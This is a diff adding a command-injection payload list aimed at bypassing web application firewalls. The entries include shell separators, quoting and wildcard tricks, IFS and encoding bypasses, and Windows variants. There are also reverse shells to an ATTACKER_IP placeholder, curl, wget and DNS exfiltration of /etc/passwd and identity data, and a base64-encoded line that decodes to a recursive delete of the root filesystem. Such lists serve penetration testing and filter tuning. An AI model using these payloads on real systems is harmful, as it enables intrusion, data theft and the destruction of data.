@@ -1,0 +1,143 @@
+# ============================================================================
+# RCE / COMMAND INJECTION - WAF BYPASS PAYLOADS
+# ============================================================================
+# Command injection payloads with filter bypass techniques
+# ============================================================================
+
+# Basic Command Separator
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; ls
+| ls
+|| ls
+& ls
+&& ls
+
+# Newline Injection
+%0a id
+%0d id
+%0a%0d id
+
+# Null Byte
+;%00
+|%00
+
+# Space Bypass (Using IFS)
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+
+# Space Bypass Variations
+cat%09/etc/passwd
+cat%0a/etc/passwd
+cat%0d/etc/passwd
+echo${IFS}test
+
+# Blacklist Bypass
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+ca$@t /etc/passwd
+ca$()t /etc/passwd
+/???/??t /etc/passwd  # /bin/cat
+/???/c?t /etc/passwd
+/bin/ca? /etc/passwd
+
+# Wildcard Characters
+/bin/c?t /etc/passwd
+/b??/c?? /etc/passwd
+/bin/c*t /etc/passwd
+
+# Variable Substitution
+$u
+$((1+1))
+${HOME}
+${PATH}
+
+# Encoding
+echo cm0gLXJmIC8= | base64 -d | bash
+echo aWQ= | base64 -d | sh
+$(echo aWQ= | base64 -d)
+
+# Hex Encoded
+$(xxd -r -p <<< 6964)
+echo -e "\x69\x64" | sh
+
+# Backtick Variations
+`whoami`
+`id`
+`cat /etc/passwd`
+
+# Dollar Sign Variations
+$(whoami)
+$(id)
+$(cat /etc/passwd)
+
+# Brace Expansion
+{cat,/etc/passwd}
+{ls,-la,/}
+{echo,test}
+
+# Tab Instead of Space
+;id	
+;cat	/etc/passwd
+
+# Double URL Encoding
+%253B id
+%257C id
+
+# Windows Command Injection
+& whoami
+| whoami
+|| whoami
+& dir
+| dir
+&& dir
+; type C:\Windows\win.ini
+| type C:\Windows\win.ini
+& net user
+
+# Windows Bypass
+w"h"oami
+w^h^o^a^m^i
+who$()ami
+cmd /c whoami
+powershell whoami
+powershell -c "whoami"
+powershell -enc d2hvYW1p
+
+# Reverse Shell Payloads (Common)
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; nc -e /bin/sh ATTACKER_IP 4444
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+# Curl/Wget for Out of Band
+; curl http://ATTACKER_IP/$(whoami)
+; wget http://ATTACKER_IP/$(id)
+| curl http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)
+
+# DNS Exfiltration
+; nslookup $(whoami).ATTACKER_DOMAIN
+; dig $(id | base64).ATTACKER_DOMAIN
+; host $(cat /etc/hostname).ATTACKER_DOMAIN
+
+# Time Delay (Detection)
+; sleep 10
+| sleep 10
+; ping -c 10 127.0.0.1
+& ping -n 10 127.0.0.1
+
+# Payload Chaining
+;$(whoami)
+;`id`
+|`whoami`
+|$(id)
